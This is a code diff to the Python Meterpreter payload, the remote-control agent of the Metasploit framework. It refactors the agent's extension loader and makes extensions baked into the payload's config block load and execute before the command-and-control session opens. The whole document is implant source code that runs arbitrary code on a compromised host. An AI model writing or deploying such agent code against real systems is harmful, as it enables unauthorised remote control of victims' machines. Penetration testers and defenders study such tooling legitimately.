@@ -1714,13 +1714,11 @@ class PythonMeterpreter(object):
         debug_print('[*] TLV encryption sorted')
         return ERROR_SUCCESS, response
 
-    def _core_loadlib(self, request, response):
-        data_tlv = packet_get_tlv(request, TLV_TYPE_DATA)
-        if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
-            return ERROR_FAILURE, response
-
+    def load_extension(self, data):
+        """Exec extension source bytes in the meterpreter symbol namespace.
+        Returns the libname that registered itself (or None)."""
         libname = '???'
-        match = re.search(r'^meterpreter\.register_extension\(\'([a-zA-Z0-9]+)\'\)$', str(data_tlv['value']), re.MULTILINE)
+        match = re.search(r'^meterpreter\.register_extension\(\'([a-zA-Z0-9]+)\'\)$', str(data), re.MULTILINE)
         if match is not None:
             libname = match.group(1)
 
@@ -1728,8 +1726,15 @@ class PythonMeterpreter(object):
         symbols_for_extensions = {'meterpreter': self}
         symbols_for_extensions.update(EXPORTED_SYMBOLS)
         i = code.InteractiveInterpreter(symbols_for_extensions)
-        i.runcode(compile(data_tlv['value'], 'ext_server_' + libname + '.py', 'exec'))
-        extension_name = self.last_registered_extension
+        i.runcode(compile(data, 'ext_server_' + libname + '.py', 'exec'))
+        return self.last_registered_extension
+
+    def _core_loadlib(self, request, response):
+        data_tlv = packet_get_tlv(request, TLV_TYPE_DATA)
+        if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
+            return ERROR_FAILURE, response
+
+        extension_name = self.load_extension(data_tlv['value'])
 
         if extension_name:
             check_extension = lambda x: x.startswith(extension_name)
@@ -1957,6 +1962,13 @@ def parse_config_block(raw):
         transports.append(transport)
     config['transports'] = transports
 
+    extensions = []
+    for ext_tlv in packet_enum_tlvs(config_bytes, TLV_TYPE_EXTENSION):
+        data_tlv = packet_get_tlv(ext_tlv['value'], TLV_TYPE_DATA)
+        data = data_tlv.get('value')
+        extensions.append(data) if data else None
+    config['extensions'] = extensions
+
     return config
 
 # PATCH-SETUP-ENCRYPTION #
@@ -1991,4 +2003,11 @@ if not _try_to_fork or (_try_to_fork and os.fork() == 0):
     met.session_expiry_end = time.time() + config['session_expiry']
     for t in config['transports'][1:]:
         met.transports.append(t)
+    # Hot-load any extensions baked into the config block (EXTENSIONS=)
+    # before opening the C2 session, so the framework sees them at connect.
+    for ext_data in config.get('extensions', []):
+        try:
+            met.load_extension(ext_data)
+        except Exception:
+            debug_traceback('[-] failed to load baked extension')
     met.run()
